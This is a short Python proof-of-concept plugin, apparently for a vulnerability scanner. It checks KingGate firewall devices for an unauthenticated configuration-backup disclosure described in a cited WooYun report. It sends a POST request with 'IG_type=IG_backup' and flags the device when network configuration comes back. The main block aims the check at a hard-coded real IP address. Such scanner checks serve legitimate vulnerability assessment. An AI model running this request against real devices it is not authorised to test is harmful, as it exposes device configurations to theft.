#!/usr/bin/env python
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2010-0135128
import urlparse
def assign(service, arg):
    if service == "kinggate":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'src/system/default.php'
    postdata = "IG_type=IG_backup"
    code, head, res, errcode, _ = curl.curl2(url,post=postdata)
    if code==200 and 'config network' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('kinggate', 'https://202.103.238.229/')[1])